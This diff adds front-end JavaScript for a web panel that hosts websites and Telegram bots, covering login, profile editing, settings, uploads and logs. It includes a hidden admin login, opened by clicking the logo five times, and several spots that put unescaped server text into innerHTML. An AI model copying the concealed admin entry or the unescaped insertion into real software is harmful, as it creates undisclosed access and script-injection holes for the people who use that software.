+                return originalFetch(url, options).then(response => {
+                    if (response.status === 401) {
+                        window.location.href = '/';
+                        return Promise.reject('Unauthorized');
+                    }
+                    return response;
+                });
+            };
+
+            // ---------- CUSTOM MODAL ----------
+            const modalOverlay = document.getElementById('customModalOverlay');
+            const modalIcon = document.getElementById('modalIcon');
+            const modalBody = document.getElementById('modalBody');
+            const modalActions = document.getElementById('modalActions');
+
+            function showCustomModal(icon, bodyHTML, buttons) {
+                return new Promise((resolve) => {
+                    modalIcon.textContent = icon || '⚠️';
+                    modalBody.innerHTML = bodyHTML || '';
+                    modalActions.innerHTML = '';
+                    buttons.forEach((btn) => {
+                        const buttonEl = document.createElement('button');
+                        buttonEl.textContent = btn.label;
+                        buttonEl.className = btn.className || 'btn-confirm';
+                        buttonEl.addEventListener('click', () => {
+                            closeModal();
+                            resolve(btn.value);
+                        });
+                        modalActions.appendChild(buttonEl);
+                    });
+                    modalOverlay.classList.add('open');
+                });
+            }
+
+            window.customAlert = function(message, icon = 'ℹ️') {
+                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
+                    { label: 'OK', value: true, className: 'btn-ok' }
+                ]);
+            };
+
+            window.customConfirm = function(message, icon = '⚠️') {
+                return showCustomModal(icon, `<div style="font-size:16px;color:#eee;">${message}</div>`, [
+                    { label: 'Cancel', value: false, className: 'btn-cancel' },
+                    { label: 'OK', value: true, className: 'btn-confirm' }
+                ]);
+            };
+
+            function closeModal() {
+                modalOverlay.classList.remove('open');
+            }
+
+            // ---------- SECRET KEY LOGIN (Logo clicks) ----------
+            let loginIconClickCount = 0;
+            let loginIconTimer = null;
+
+            document.getElementById('loginIcon').addEventListener('click', function(e) {
+                loginIconClickCount++;
+                clearTimeout(loginIconTimer);
+                loginIconTimer = setTimeout(() => { loginIconClickCount = 0; }, 2000);
+
+                if (loginIconClickCount >= 5) {
+                    loginIconClickCount = 0;
+                    showSecretKeyModal();
+                }
+            });
+
+            async function showSecretKeyModal() {
+                const bodyHTML = `
+                    <div style="text-align:center;">
+                        <p style="margin-bottom:12px;">Enter Secret Key to login as Admin:</p>
+                        <input type="password" id="secretKeyInput" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                    </div>
+                `;
+                const result = await showCustomModal('🔑', bodyHTML, [
+                    { label: 'Cancel', value: false, className: 'btn-cancel' },
+                    { label: 'Login', value: true, className: 'btn-confirm' }
+                ]);
+                if (result) {
+                    const secret = document.getElementById('secretKeyInput')?.value;
+                    if (!secret) {
+                        await customAlert('Enter secret key.', '⚠️');
+                        return;
+                    }
+                    try {
+                        const res = await fetch('/api/secret_login', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ secret })
+                        });
+                        const data = await res.json();
+                        if (data.success) {
+                            location.reload();
+                        } else {
+                            await customAlert(data.error || 'Invalid secret', '❌');
+                        }
+                    } catch(e) {
+                        await customAlert('Error: ' + e.message, '❌');
+                    }
+                }
+            }
+
+            // ---------- PROFILE EDIT ----------
+            const editProfileBtn = document.getElementById('editProfileBtn');
+            if (editProfileBtn) {
+                editProfileBtn.addEventListener('click', async function() {
+                    const currentUsername = '{{ username }}';
+                    const bodyHTML = `
+                        <div style="text-align:center;">
+                            <div style="font-size:20px; margin-bottom:20px;">✎ Edit Profile</div>
+                            <div style="margin-bottom:12px;">
+                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Username</label>
+                                <input type="text" id="editUsername" value="${currentUsername}" style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                            </div>
+                            <div>
+                                <label style="display:block;color:#aaa;font-size:13px;margin-bottom:4px;">New Password (leave blank to keep current)</label>
+                                <input type="password" id="editPassword" placeholder="New password..." style="width:100%;background:#161b25;border:1px solid #2b3240;color:white;padding:12px;border-radius:8px;outline:none;" />
+                            </div>
+                        </div>
+                    `;
+                    const result = await showCustomModal('✎', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: 'Save', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newUsername = document.getElementById('editUsername').value.trim();
+                        const newPassword = document.getElementById('editPassword').value.trim();
+                        try {
+                            const res = await fetch('/api/profile', {
+                                method: 'PUT',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ username: newUsername, password: newPassword })
+                            });
+                            const data = await res.json();
+                            if (data.success) {
+                                if (data.logout) {
+                                    await customAlert('Profile updated! You will be logged out.', '✅');
+                                    window.location.href = '/';
+                                } else {
+                                    await customAlert('Profile updated!', '✅');
+                                    location.reload();
+                                }
+                            } else {
+                                await customAlert(data.error || 'Update failed', '❌');
+                            }
+                        } catch (e) {
+                            // handled by interceptor
+                        }
+                    }
+                });
+            }
+
+            // ---------- SETTINGS MODAL ----------
+            const settingsModalOverlay = document.getElementById('settingsModalOverlay');
+            const settingsCancelBtn = document.getElementById('settingsCancelBtn');
+            const settingsSaveBtn = document.getElementById('settingsSaveBtn');
+            const settingsWebsiteName = document.getElementById('settingsWebsiteName');
+            const settingsTelegram = document.getElementById('settingsTelegram');
+            const settingsYoutube = document.getElementById('settingsYoutube');
+            const settingsInstagram = document.getElementById('settingsInstagram');
+            const settingsTiktok = document.getElementById('settingsTiktok');
+            const settingsLogoInput = document.getElementById('settingsLogoInput');
+            const settingsLogoPreview = document.getElementById('settingsLogoPreview');
+            const settingsRemoveLogoBtn = document.getElementById('settingsRemoveLogoBtn');
+
+            let currentSettings = {};
+
+            async function loadSettings() {
+                try {
+                    const res = await fetch('/api/settings');
+                    const data = await res.json();
+                    currentSettings = data;
+                    settingsWebsiteName.value = data.website_name || 'YUVICODEX';
+                    settingsTelegram.value = data.social_links?.telegram || '#';
+                    settingsYoutube.value = data.social_links?.youtube || '#';
+                    settingsInstagram.value = data.social_links?.instagram || '#';
+                    settingsTiktok.value = data.social_links?.tiktok || '#';
+                    if (data.logo) {
+                        settingsLogoPreview.innerHTML = `<img src="${data.logo}" class="logo-preview" />`;
+                    } else {
+                        settingsLogoPreview.innerHTML = '';
+                    }
+                } catch (e) {
+                    console.error('Failed to load settings', e);
+                }
+            }
+
+            async function saveSettings() {
+                const payload = {
+                    website_name: settingsWebsiteName.value.trim() || 'YUVICODEX',
+                    social_links: {
+                        telegram: settingsTelegram.value.trim() || '#',
+                        youtube: settingsYoutube.value.trim() || '#',
+                        instagram: settingsInstagram.value.trim() || '#',
+                        tiktok: settingsTiktok.value.trim() || '#'
+                    }
+                };
+                try {
+                    const res = await fetch('/api/settings', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Settings saved successfully!', '✅');
+                        closeSettingsModal();
+                        location.reload();
+                    } else {
+                        await customAlert('Failed to save settings.', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            async function uploadLogo(file) {
+                const formData = new FormData();
+                formData.append('logo', file);
+                try {
+                    const res = await fetch('/api/settings/logo', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Logo uploaded!', '✅');
+                        await loadSettings();
+                        location.reload();
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            async function removeLogo() {
+                const confirmed = await customConfirm('Remove logo?', '🗑️');
+                if (!confirmed) return;
+                try {
+                    const res = await fetch('/api/settings/logo', { method: 'DELETE' });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert('Logo removed.', '✅');
+                        await loadSettings();
+                        closeSettingsModal();
+                        setTimeout(() => { location.reload(); }, 500);
+                    } else {
+                        await customAlert('Failed to remove logo.', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                }
+            }
+
+            function openSettingsModal() {
+                loadSettings();
+                settingsModalOverlay.classList.add('open');
+            }
+
+            function closeSettingsModal() {
+                settingsModalOverlay.classList.remove('open');
+            }
+
+            settingsCancelBtn.addEventListener('click', closeSettingsModal);
+            settingsSaveBtn.addEventListener('click', saveSettings);
+            settingsRemoveLogoBtn.addEventListener('click', removeLogo);
+            settingsLogoInput.addEventListener('change', function() {
+                if (this.files.length > 0) {
+                    uploadLogo(this.files[0]);
+                    this.value = '';
+                }
+            });
+            settingsModalOverlay.addEventListener('click', function(e) {
+                if (e.target === this) closeSettingsModal();
+            });
+
+            // ---------- DOM REFS ----------
+            const loginView = document.getElementById('loginView');
+            const userView = document.getElementById('userView');
+            const adminOverlay = document.getElementById('adminOverlay');
+
+            const loginUsername = document.getElementById('loginUsername');
+            const loginPassword = document.getElementById('loginPassword');
+            const loginRoleSelect = document.getElementById('loginRoleSelect');
+            const loginBtn = document.getElementById('loginBtn');
+            const loginError = document.getElementById('loginError');
+
+            const hamburgerBtn = document.getElementById('hamburgerBtn');
+            const adminCloseBtn = document.getElementById('adminCloseBtn');
+            const logoutBtn = document.getElementById('logoutBtn');
+
+            const botListContainer = document.getElementById('botListContainer');
+            const botConsole = document.getElementById('botConsole');
+            const websiteGrid = document.getElementById('websiteGrid');
+            const websiteConsole = document.getElementById('websiteConsole');
+
+            const uploadCardWebsite = document.getElementById('uploadCardWebsite');
+            const deployBtnWebsite = document.getElementById('deployBtnWebsite');
+            const fileInputWebsite = document.getElementById('fileInputWebsite');
+            const fileCountDisplayWebsite = document.getElementById('fileCountDisplayWebsite');
+
+            const uploadCardBot = document.getElementById('uploadCardBot');
+            const deployBtnBot = document.getElementById('deployBtnBot');
+            const fileInputBot = document.getElementById('fileInputBot');
+            const fileCountDisplayBot = document.getElementById('fileCountDisplayBot');
+
+            const fullUserListContainer = document.getElementById('fullUserListContainer');
+            const simpleAdminListContainer = document.getElementById('simpleAdminListContainer');
+            const simpleUserListContainer = document.getElementById('simpleUserListContainer');
+
+            const toggleCreateUserBtn = document.getElementById('toggleCreateUserBtn');
+            const createUserForm = document.getElementById('createUserForm');
+            const newUsername = document.getElementById('newUsername');
+            const newPassword = document.getElementById('newPassword');
+            const newExpiry = document.getElementById('newExpiry');
+            const newRole = document.getElementById('newRole');
+            const createUserBtn = document.getElementById('createUserBtn');
+
+            const terminalOutput = document.getElementById('terminalOutput');
+            const terminalCommand = document.getElementById('terminalCommand');
+            const termRunBtn = document.getElementById('termRunBtn');
+            const termStopBtn = document.getElementById('termStopBtn');
+            const termClearBtn = document.getElementById('termClearBtn');
+
+            // ---------- STATE ----------
+            let currentUser = null;
+            let selectedBotId = null;
+            let selectedWebsiteId = null;
+            let logPollInterval = null;
+            let websiteLogInterval = null;
+            let botLogInterval = null;
+            let uptimeIntervals = {};
+            let terminalPollInterval = null;
+            let isTerminalRunning = false;
+
+            // ---------- API HELPERS ----------
+            async function apiCall(url, options = {}) {
+                const res = await fetch(url, {
+                    ...options,
+                    headers: { 'Content-Type': 'application/json', ...options.headers }
+                });
+                if (!res.ok) {
+                    const err = await res.json().catch(() => ({}));
+                    throw new Error(err.error || 'API error');
+                }
+                return res.json();
+            }
+
+            // ---------- LOGIN / LOGOUT ----------
+            async function handleLogin() {
+                const username = loginUsername.value.trim();
+                const password = loginPassword.value.trim();
+                const role = loginRoleSelect.value;
+                loginError.textContent = '';
+                if (!username || !password) {
+                    loginError.textContent = 'Please enter username and password.';
+                    return;
+                }
+                try {
+                    const data = await apiCall('/login', {
+                        method: 'POST',
+                        body: JSON.stringify({ username, password, role })
+                    });
+                    if (data.success) {
+                        currentUser = { username: data.username, role: data.role };
+                        location.reload();
+                    }
+                } catch (e) {
+                    loginError.textContent = e.message || 'Login failed';
+                }
+            }
+
+            async function handleLogout() {
+                const confirmed = await customConfirm('Logout?', '👋');
+                if (!confirmed) return;
+                try {
+                    await apiCall('/logout', { method: 'POST' });
+                } catch (_) {}
+                location.reload();
+            }
+
+            // ---------- TAB SWITCHING ----------
+            const tabBtns = document.querySelectorAll('.tabs .tab-btn');
+            tabBtns.forEach(btn => {
+                btn.addEventListener('click', function() {
+                    tabBtns.forEach(b => b.classList.remove('active'));
+                    this.classList.add('active');
+                    const tabId = this.dataset.tab;
+                    document.querySelectorAll('.tab-content').forEach(tc => tc.classList.remove('active'));
+                    document.getElementById('tab-' + tabId).classList.add('active');
+                    if (tabId === 'websites') {
+                        loadWebsites();
+                    } else if (tabId === 'bots') {
+                        loadBots();
+                    }
+                });
+            });
+
+            // ---------- WEBSITES ----------
+            async function loadWebsites() {
+                try {
+                    const res = await fetch('/api/websites');
+                    const data = await res.json();
+                    renderWebsites(data);
+                } catch (e) {
+                    console.error('Failed to load websites:', e);
+                    websiteGrid.innerHTML = `<div class="empty-msg">Error loading websites</div>`;
+                }
+            }
+
+            function renderWebsites(websites) {
+                if (!websites || websites.length === 0) {
+                    websiteGrid.innerHTML = `<div class="empty-msg">No websites deployed. Upload a project!</div>`;
+                    return;
+                }
+                let html = '';
+                websites.forEach(w => {
+                    const statusClass = w.status === 'running' ? 'running' : 'stopped';
+                    const uptimeDisplay = w.status === 'running' && w.last_start_time ?
+                        formatUptime((Date.now() / 1000) - new Date(w.last_start_time).getTime()/1000) :
+                        '--';
+                    const selected = (w.id === selectedWebsiteId) ? 'selected' : '';
+                    html += `
+                        <div class="website-card ${selected}" data-id="${w.id}">
+                            <div class="website-header">
+                                <span class="website-name">${escapeHtml(w.website_name || w.website_slug)}</span>
+                                <span class="bot-status ${statusClass}">● ${w.status.toUpperCase()}</span>
+                            </div>
+                            <div class="website-slug">🔗 ${escapeHtml(w.website_slug)}</div>
+                            <div class="website-port">Port: ${w.allocated_port || 'N/A'}</div>
+                            <div class="bot-uptime" id="w-uptime-${w.id}">UPTIME: ${uptimeDisplay}</div>
+                            <div class="website-actions">
+                                <button class="btn-start-w" data-action="start-w" data-id="${w.id}">▶ START</button>
+                                <button class="btn-stop-w" data-action="stop-w" data-id="${w.id}">⏹ STOP</button>
+                                <button class="btn-restart-w" data-action="restart-w" data-id="${w.id}">⟳ RESTART</button>
+                                <button class="btn-delete-w" data-action="delete-w" data-id="${w.id}">🗑 DELETE</button>
+                                <button class="btn-edit-w" data-action="edit-w" data-id="${w.id}">✎ EDIT</button>
+                                <button class="btn-download-w" data-action="download-w" data-id="${w.id}">⬇ DOWNLOAD</button>
+                                <button class="btn-files-w" data-action="files-w" data-id="${w.id}">📁 FILES</button>
+                                <button class="btn-buildlogs-w" data-action="buildlogs-w" data-id="${w.id}">🖥 BUILD LOGS</button>
+                            </div>
+                            <div class="name-edit">
+                                <input type="text" placeholder="Rename" id="w-name-input-${w.id}" value="${escapeHtml(w.website_name || '')}" />
+                                <button onclick="renameWebsite(${w.id})">Rename</button>
+                            </div>
+                        </div>
+                    `;
+                });
+                websiteGrid.innerHTML = html;
+
+                // Attach events
+                document.querySelectorAll('.website-card [data-action]').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const action = this.dataset.action;
+                        const id = parseInt(this.dataset.id);
+                        if (action === 'start-w') {
+                            await websiteAction(id, 'start');
+                        } else if (action === 'stop-w') {
+                            await websiteAction(id, 'stop');
+                        } else if (action === 'restart-w') {
+                            await websiteAction(id, 'restart');
+                        } else if (action === 'delete-w') {
+                            const confirmed = await customConfirm('Delete this website?', '🗑️');
+                            if (confirmed) {
+                                await websiteAction(id, 'delete');
+                            }
+                        } else if (action === 'edit-w') {
+                            await editWebsite(id);
+                        } else if (action === 'download-w') {
+                            window.open(`/api/website/${id}/download`, '_blank');
+                        } else if (action === 'files-w') {
+                            window.open(`/website/${id}/files`, '_blank');
+                        } else if (action === 'buildlogs-w') {
+                            window.open(`/website/${id}/build`, '_blank');
+                        }
+                    });
+                });
+
+                // Click card to select and show logs
+                document.querySelectorAll('.website-card').forEach(card => {
+                    card.addEventListener('click', function(e) {
+                        if (e.target.closest('button') || e.target.closest('.name-edit')) return;
+                        const id = parseInt(this.dataset.id);
+                        selectWebsite(id);
+                    });
+                });
+
+                // Uptime updates
+                websites.forEach(w => {
+                    if (w.status === 'running' && w.last_start_time) {
+                        const start = new Date(w.last_start_time).getTime() / 1000;
+                        startUptimeUpdate('w-uptime-' + w.id, start);
+                    }
+                });
+
+                if (!selectedWebsiteId && websites.length > 0) {
+                    selectWebsite(websites[0].id);
+                }
+            }
+
+            async function websiteAction(id, action) {
+                try {
+                    const res = await apiCall(`/api/website/${id}/${action}`, { method: 'POST' });
+                    if (res.success) {
+                        await loadWebsites();
+                    } else {
+                        await customAlert(res.error || 'Action failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            async function editWebsite(id) {
+                try {
+                    const data = await apiCall(`/api/website/${id}/content`);
+                    const content = data.content || '';
+                    const bodyHTML = `
+                        <div style="margin-bottom:8px;">
+                            <button class="btn-sm" id="copyAllBtnW" style="padding:6px 14px;font-size:0.55rem;border:1px solid #33ddff;color:#33ddff;background:transparent;border-radius:6px;cursor:pointer;">
+                                📋 Copy All
+                            </button>
+                        </div>
+                        <textarea id="editFileContentW" rows="15" style="width:100%;background:#050807;color:#00ff88;border:1px solid #333;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:0.7rem;resize:vertical;tab-size:4;">${escapeHtml(content)}</textarea>
+                    `;
+                    const result = await showCustomModal('✎ Edit File', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: '💾 SAVE', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newContent = document.getElementById('editFileContentW').value;
+                        try {
+                            await apiCall(`/api/website/${id}/content`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ content: newContent })
+                            });
+                            await customAlert('File saved and website restarted (if running).', '✅');
+                            await loadWebsites();
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    }
+                    setTimeout(() => {
+                        const copyBtn = document.getElementById('copyAllBtnW');
+                        if (copyBtn) {
+                            copyBtn.onclick = function() {
+                                const textarea = document.getElementById('editFileContentW');
+                                textarea.select();
+                                try {
+                                    navigator.clipboard.writeText(textarea.value).then(() => {
+                                        customAlert('📋 Copied all code!', '✅');
+                                    }).catch(() => {
+                                        document.execCommand('copy');
+                                        customAlert('📋 Copied!', '✅');
+                                    });
+                                } catch(e) {
+                                    document.execCommand('copy');
+                                    customAlert('📋 Copied!', '✅');
+                                }
+                            };
+                        }
+                    }, 100);
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            function selectWebsite(id) {
+                selectedWebsiteId = id;
+                document.querySelectorAll('.website-card').forEach(c => c.classList.remove('selected'));
+                const card = document.querySelector(`.website-card[data-id="${id}"]`);
+                if (card) card.classList.add('selected');
+                loadWebsiteLogs(id);
+                if (websiteLogInterval) clearInterval(websiteLogInterval);
+                websiteLogInterval = setInterval(() => loadWebsiteLogs(id, true), 3000);
+            }
+
+            async function loadWebsiteLogs(id, silent = false) {
+                try {
+                    const data = await apiCall(`/api/website/${id}/logs`);
+                    websiteConsole.textContent = data.logs || 'No logs yet.';
+                } catch (e) {
+                    if (!silent) websiteConsole.textContent = 'Error loading logs.';
+                }
+            }
+
+            async function renameWebsite(id) {
+                const input = document.getElementById('w-name-input-' + id);
+                const newName = input.value.trim();
+                if (!newName) return;
+                try {
+                    const formData = new FormData();
+                    formData.append('name', newName);
+                    const res = await fetch(`/api/website/${id}/rename`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await loadWebsites();
+                    } else {
+                        await customAlert(data.error || 'Rename failed', '❌');
+                    }
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            // ---------- WEBSITE UPLOAD ----------
+            uploadCardWebsite.addEventListener('click', function(e) {
+                if (e.target.closest('.deploy-btn')) return;
+                fileInputWebsite.click();
+            });
+
+            deployBtnWebsite.addEventListener('click', async function() {
+                if (fileInputWebsite.files.length === 0) {
+                    await customAlert('Please select at least one file first.', '⚠️');
+                    return;
+                }
+                const formData = new FormData();
+                for (let i = 0; i < fileInputWebsite.files.length; i++) {
+                    formData.append('files[]', fileInputWebsite.files[i]);
+                }
+                try {
+                    deployBtnWebsite.textContent = 'UPLOADING...';
+                    deployBtnWebsite.disabled = true;
+                    const res = await fetch('/upload_website', {
+                        method: 'POST',
+                        body: formData
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        await customAlert(`Website deployed! ID: ${data.website_id}`, '✅');
+                        await loadWebsites();
+                        fileInputWebsite.value = '';
+                        fileCountDisplayWebsite.textContent = '';
+                    } else {
+                        await customAlert(data.error || 'Upload failed', '❌');
+                    }
+                } catch (e) {
+                    // handled by interceptor
+                } finally {
+                    deployBtnWebsite.textContent = 'DEPLOY WEBSITE';
+                    deployBtnWebsite.disabled = false;
+                }
+            });
+
+            fileInputWebsite.addEventListener('change', function() {
+                const count = this.files.length;
+                if (count === 0) {
+                    fileCountDisplayWebsite.textContent = '';
+                } else {
+                    const names = Array.from(this.files).map(f => f.name).join(', ');
+                    fileCountDisplayWebsite.textContent = `${count} file(s) selected: ${names}`;
+                }
+            });
+
+            // ---------- BOTS (original) ----------
+            async function loadBots() {
+                try {
+                    const bots = await apiCall('/api/bots');
+                    renderBots(bots);
+                } catch (e) {
+                    console.error('Failed to load bots:', e);
+                    botListContainer.innerHTML = `<div class="empty-msg">Error loading bots</div>`;
+                }
+            }
+
+            function renderBots(bots) {
+                if (!bots || bots.length === 0) {
+                    botListContainer.innerHTML = `<div class="empty-msg">No bots deployed. Upload a project!</div>`;
+                    return;
+                }
+                let html = '';
+                bots.forEach(bot => {
+                    const statusClass = bot.status === 'running' ? 'running' : 'stopped';
+                    const uptimeDisplay = bot.status === 'running' && bot.start_time ?
+                        formatUptime(Date.now() / 1000 - bot.start_time) :
+                        '--';
+                    const selected = (bot.id === selectedBotId) ? 'selected' : '';
+                    const ownerDisplay = bot.user || 'unknown';
+                    const hasToken = bot.has_token || false;
+                    const botUsername = bot.bot_username || null;
+                    html += `
+                        <div class="bot-card ${selected}" data-id="${bot.id}" data-start-time="${bot.start_time || ''}">
+                            <div class="bot-header">
+                                <span class="bot-name">${escapeHtml(bot.filename)}</span>
+                                <span class="bot-status ${statusClass}">● ${bot.status.toUpperCase()}</span>
+                            </div>
+                            <div class="bot-owner">👤 ${escapeHtml(ownerDisplay)}</div>
+                            <div class="bot-uptime" id="uptime-${bot.id}">UPTIME: ${uptimeDisplay}</div>
+                            <div class="bot-controls">
+                                <button class="btn-start" data-action="start">${bot.status === 'running' ? '▶ RUNNING' : '▶ START'}</button>
+                                <button class="btn-stop" data-action="stop">⏹ STOP</button>
+                                <button class="btn-edit" data-action="edit">✎ EDIT</button>
+                                <button class="btn-restart" data-action="restart">⟳ RESTART</button>
+                                <button class="btn-download" data-action="download">⬇ DOWNLOAD</button>
+                                <button class="btn-delete" data-action="delete">🗑 DELETE</button>
+                                ${(hasToken && botUsername) ? `<button class="btn-openbot" data-action="openbot" data-bot="${botUsername}">🤖 Open Bot</button>` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+                botListContainer.innerHTML = html;
+
+                // Attach events
+                document.querySelectorAll('.bot-card').forEach(card => {
+                    card.addEventListener('click', function(e) {
+                        if (e.target.closest('button')) return;
+                        const id = this.dataset.id;
+                        selectBot(id);
+                    });
+                });
+
+                document.querySelectorAll('.bot-card [data-action]').forEach(btn => {
+                    btn.addEventListener('click', async function(e) {
+                        e.stopPropagation();
+                        const action = this.dataset.action;
+                        const card = this.closest('.bot-card');
+                        const botId = card.dataset.id;
+                        const originalText = this.textContent;
+                        this.disabled = true;
+                        if (action === 'start') this.textContent = '⏳ Starting...';
+                        else if (action === 'stop') this.textContent = '⏳ Stopping...';
+                        else if (action === 'restart') this.textContent = '⏳ Restarting...';
+                        else if (action === 'delete') this.textContent = '⏳ Deleting...';
+                        else if (action === 'edit') { /* don't disable */ }
+                        else if (action === 'download') { /* don't disable */ }
+                        else if (action === 'openbot') { /* don't disable */ }
+                        try {
+                            if (action === 'openbot') {
+                                const botUsername = this.dataset.bot;
+                                if (botUsername) {
+                                    window.open(`https://t.me/${botUsername}`, '_blank');
+                                    await customAlert(`🤖 Opening @${botUsername}`, '✅');
+                                }
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
+                            }
+                            if (action === 'edit') {
+                                await openEditModal(botId);
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
+                            }
+                            if (action === 'download') {
+                                window.open(`/api/bots/${botId}/download`, '_blank');
+                                this.disabled = false;
+                                this.textContent = originalText;
+                                return;
+                            }
+                            await handleBotAction(botId, action);
+                        } catch (e) {
+                            // error already handled
+                        } finally {
+                            if (action !== 'edit' && action !== 'download' && action !== 'openbot') {
+                                this.disabled = false;
+                                this.textContent = originalText;
+                            }
+                        }
+                    });
+                });
+
+                // Start live uptime updates for running bots
+                bots.forEach(bot => {
+                    if (bot.status === 'running' && bot.start_time) {
+                        startUptimeUpdate('uptime-' + bot.id, bot.start_time);
+                    }
+                });
+
+                if (!selectedBotId && bots.length > 0) {
+                    selectBot(bots[0].id);
+                }
+            }
+
+            function startUptimeUpdate(elId, startTime) {
+                if (uptimeIntervals[elId]) clearInterval(uptimeIntervals[elId]);
+                const el = document.getElementById(elId);
+                if (!el) return;
+                uptimeIntervals[elId] = setInterval(() => {
+                    const now = Date.now() / 1000;
+                    const diff = now - startTime;
+                    el.textContent = 'UPTIME: ' + formatUptime(diff);
+                }, 1000);
+            }
+
+            function stopUptimeUpdate(elId) {
+                if (uptimeIntervals[elId]) {
+                    clearInterval(uptimeIntervals[elId]);
+                    delete uptimeIntervals[elId];
+                }
+            }
+
+            function selectBot(botId) {
+                selectedBotId = botId;
+                document.querySelectorAll('.bot-card').forEach(c => c.classList.remove('selected'));
+                const card = document.querySelector(`.bot-card[data-id="${botId}"]`);
+                if (card) card.classList.add('selected');
+                loadBotLogs(botId);
+                if (botLogInterval) clearInterval(botLogInterval);
+                botLogInterval = setInterval(() => loadBotLogs(botId, true), 3000);
+            }
+
+            async function loadBotLogs(botId, silent = false) {
+                try {
+                    const data = await apiCall(`/api/bots/${botId}/logs`);
+                    botConsole.textContent = data.logs || 'No logs yet.';
+                } catch (e) {
+                    if (!silent) botConsole.textContent = 'Error loading logs.';
+                }
+            }
+
+            async function handleBotAction(botId, action) {
+                try {
+                    if (action === 'start') {
+                        await apiCall(`/api/bots/${botId}/start`, { method: 'POST' });
+                    } else if (action === 'stop') {
+                        await apiCall(`/api/bots/${botId}/stop`, { method: 'POST' });
+                    } else if (action === 'restart') {
+                        await apiCall(`/api/bots/${botId}/restart`, { method: 'POST' });
+                    } else if (action === 'delete') {
+                        const confirmed = await customConfirm('Delete this bot?', '🗑️');
+                        if (!confirmed) return;
+                        await apiCall(`/api/bots/${botId}`, { method: 'DELETE' });
+                        if (selectedBotId === botId) {
+                            selectedBotId = null;
+                            if (botLogInterval) clearInterval(botLogInterval);
+                            botConsole.textContent = 'Bot deleted.';
+                        }
+                    } else {
+                        return;
+                    }
+                    await loadBots();
+                } catch (e) {
+                    await customAlert(e.message || 'Action failed', '❌');
+                }
+            }
+
+            async function openEditModal(botId) {
+                try {
+                    const data = await apiCall(`/api/bots/${botId}/content`);
+                    const content = data.content || '';
+                    const bodyHTML = `
+                        <div style="margin-bottom:8px;">
+                            <button class="btn-sm" id="copyAllBtn" style="padding:6px 14px;font-size:0.55rem;border:1px solid #33ddff;color:#33ddff;background:transparent;border-radius:6px;cursor:pointer;">
+                                📋 Copy All
+                            </button>
+                        </div>
+                        <textarea id="editFileContent" rows="15" style="width:100%;background:#050807;color:#00ff88;border:1px solid #333;border-radius:6px;padding:10px;font-family:'Courier New',monospace;font-size:0.7rem;resize:vertical;tab-size:4;">${escapeHtml(content)}</textarea>
+                    `;
+                    const result = await showCustomModal('✎ Edit File', bodyHTML, [
+                        { label: 'Cancel', value: false, className: 'btn-cancel' },
+                        { label: '💾 SAVE', value: true, className: 'btn-confirm' }
+                    ]);
+                    if (result) {
+                        const newContent = document.getElementById('editFileContent').value;
+                        try {
+                            await apiCall(`/api/bots/${botId}/content`, {
+                                method: 'PUT',
+                                body: JSON.stringify({ content: newContent })
+                            });
+                            await customAlert('File saved and bot restarted (if running).', '✅');
+                            await loadBots();
+                        } catch (e) {
+                            await customAlert(e.message, '❌');
+                        }
+                    }
+                    setTimeout(() => {
+                        const copyBtn = document.getElementById('copyAllBtn');
+                        if (copyBtn) {
+                            copyBtn.onclick = function() {
+                                const textarea = document.getElementById('editFileContent');
+                                textarea.select();
+                                try {
+                                    navigator.clipboard.writeText(textarea.value).then(() => {
+                                        customAlert('📋 Copied all code!', '✅');
+                                    }).catch(() => {
+                                        document.execCommand('copy');
+                                        customAlert('📋 Copied!', '✅');
+                                    });
+                                } catch(e) {
+                                    document.execCommand('copy');
+                                    customAlert('📋 Copied!', '✅');
+                                }
+                            };
+                        }
+                    }, 100);
+                } catch (e) {
+                    await customAlert(e.message, '❌');
+                }
+            }
+
+            // ---------- BOT UPLOAD ----------
+            uploadCardBot.addEventListener('click', function(e) {
+                if (e.target.closest('.deploy-btn')) return;
+                fileInputBot.click();
+            });
+
+            deployBtnBot.addEventListener('click', async function() {
+                if (fileInputBot.files.length === 0) {
+                    await customAlert('Please select at least one file first.', '⚠️');
+                    return;
+                }
+                const formData = new FormData();
+                for (let i = 0; i < fileInputBot.files.length; i++) {
+                    formData.append('files[]', fileInputBot.files[i]);
+                }
+                try {
+                    deployBtnBot.textContent = 'UPLOADING...';
+                    deployBtnBot.disabled = true;
+                    const res = await fetch('/upload', {
+                        method: 'POST',
+                        body: formData
+                    });
